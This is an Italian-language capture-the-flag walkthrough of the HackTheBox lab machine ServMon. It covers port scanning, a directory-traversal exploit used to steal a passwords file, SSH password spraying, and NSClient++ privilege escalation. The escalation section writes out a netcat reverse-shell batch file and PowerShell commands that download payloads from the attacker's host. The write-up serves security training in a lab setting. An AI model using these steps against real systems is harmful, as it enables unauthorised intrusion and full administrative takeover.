# ServMon

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con _nmapAutomator_.

```text
sudo nmapAutomator.sh --host 10.10.10.184 --type All
```

Il risultato della scansione è il seguente:

```text
Running all scans on 10.10.10.184

Host is likely running Windows


---------------------Starting Port Scan-----------------------

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5666/tcp open  nrpe
6699/tcp open  napster
8443/tcp open  https-alt


---------------------Starting Script Scan-----------------------

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  06:35PM       <DIR>          Users
| ftp-syst:
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp   open  http
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings:
|   GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo:
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL:
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  tcpwrapped
8443/tcp open  ssl/https-alt
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest:
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-01-17T07:58:59
|_  start_date: N/A


---------------------Starting Full Scan------------------------

PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5666/tcp  open  nrpe
6063/tcp  open  x11
6699/tcp  open  napster
8443/tcp  open  https-alt
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Making a script scan on extra ports: 6063, 49664, 49665, 49666, 49667, 49668, 49669, 49670

PORT      STATE SERVICE    VERSION
6063/tcp  open  tcpwrapped
49664/tcp open  msrpc      Microsoft Windows RPC
49665/tcp open  msrpc      Microsoft Windows RPC
49666/tcp open  msrpc      Microsoft Windows RPC
49667/tcp open  msrpc      Microsoft Windows RPC
49668/tcp open  msrpc      Microsoft Windows RPC
49669/tcp open  msrpc      Microsoft Windows RPC
49670/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```


## Enumeration
Visito la pagina http://10.10.10.184/ e vengo reindirizzato qui http://10.10.10.184/Pages/login.htm:

<p align="center">
  <img src="/Immagini/Windows-Box/ServMon/servmon-1.png"/>
</p>

Cercando su internet scopro che NVMS-1000 è un client di monitoraggio progettato specificatamente per reti di videosorveglianza. Ad esso è collegata la vulnerabilità [CVE-2019-20085](https://www.exploit-db.com/exploits/47774) (Directory Trasversal). Provo quindi ad utilizzare lo script [nvms.py](https://github.com/AleDiBen/NVMS1000-Exploit/tree/master) per verificarne l'effettiva vulnerabilità:

```bash
python3 nvms.py 10.10.10.184 Windows/system.ini win.ini
```

Ottengo il seguente risultato:

```text
[+] DT Attack Succeeded
[+] Saving File Content
[+] Saved
[+] File Content

++++++++++ BEGIN ++++++++++
; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]

++++++++++  END  ++++++++++
```

Quindi è vulnerabile!

Procedo visitando la pagina https://10.10.10.184:8443/index.html:

<p align="center">
  <img src="/Immagini/Windows-Box/ServMon/servmon-2.png"/>
</p>

Qui trovo _NSClient++_, un agente utilizzato per il monitoraggio. Dopo una breve ricerca su internet scopro che è [vulnerabile](https://www.exploit-db.com/exploits/46802) e che può essere utilizzato per eseguire Privilege Escalation.

Ora provo con FTP, dove è permesso l'accesso in modalità anonima. Quindi scarico tutti i file tramite il seguente comando:

```bash
wget -r ftp://anonymous:@10.10.10.184
```

Così facendo entro in possesso dei seguenti file:

<p align="center">
  <img src="/Immagini/Windows-Box/ServMon/servmon-3.png"/>
</p>

Quindi devo trovare un modo per accedere al file "Passwords.txt".

## Exploitation
Sfrutto la vulnerabilità Directory Trasversal precedentemente trovata per accedere al file:

```bash
python3 nvms.py 10.10.10.184 users/nathan/desktop/passwords.txt passwords.txt
```

Ottenendo il seguente risultato:

<p align="center">
  <img src="/Immagini/Windows-Box/ServMon/servmon-4.png"/>
</p>

Utilizzo _crackmapexec_ per controllare se una di queste password può essere utilizzata per accedere tramite ssh. Prima di lanciare il tool creo un file users:

```text
administrator
nathan
nadine
```

Quindi procedo:

```bash
crackmapexec ssh 10.10.10.184 -u users -p passwords.txt
```

<p align="center">
  <img src="/Immagini/Windows-Box/ServMon/servmon-5.png"/>
</p>

Scopro così la password dell'utente _nadine_ per accedere tramite ssh.

Eseguo l'accesso e ottengo il primo flag:

<p align="center">
  <img src="/Immagini/Windows-Box/ServMon/servmon-6.png"/>
</p>

## Privilege Escalation
Ora devo trovare un modo per elevare i miei privilegi.

Girovagando tra le direcotory trovo questo:

<p align="center">
  <img src="/Immagini/Windows-Box/ServMon/servmon-7.png"/>
</p>

Provo quindi ad utilizzarla nel form della pagina https://10.10.10.184:8443/index.html:

<p align="center">
  <img src="/Immagini/Windows-Box/ServMon/servmon-8.png"/>
</p>

Ottengo però questo errore.

Controllando il file "nsclient.ini" trovato in precedenza scopro che è permesso l'accesso soltanto da locale (127.0.0.1). Provo quindi a realizzare un tunnel tramite _sshpass_:

```bash
sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
```

Questa volta riesco ad accedere:

<p align="center">
  <img src="/Immagini/Windows-Box/ServMon/servmon-9.png"/>
</p>

Ora seguo i passaggi di questo [exploit](https://www.exploit-db.com/exploits/46802).

Creo il file "evil.bat" contenente il seguente testo:

```githubexploit
C:\ProgramData\nc.exe 10.10.14.8 6666 -e cmd
```

Carico i file [nc.exe](https://github.com/int0x33/nc.exe/) e evil.bat sulla macchina vittima:

```bash
powershell Invoke-WebRequest http://10.10.14.8:1111/nc.exe -OutFile C:\ProgramData\nc.exe
powershell Invoke-WebRequest http://10.10.14.8:1111/evil.bat -OutFile C:\ProgramData\evil.bat
```

Quindi vado su "Settings -> External Scripts -> Scripts -> + Add new" e inserisco i seguenti valori:

<p align="center">
  <img src="/Immagini/Windows-Box/ServMon/servmon-10.png"/>
</p>

Poi vado su "Settings > Scheduler > Schedules -> + Add new" e inserisco i seguenti valori:

<p align="center">
  <img src="/Immagini/Windows-Box/ServMon/servmon-11.png"/>
</p>

Attendo per un minuto e ottengo una shell con privilegi da amministratore:

<p align="center">
  <img src="/Immagini/Windows-Box/ServMon/servmon-12.png"/>
</p>
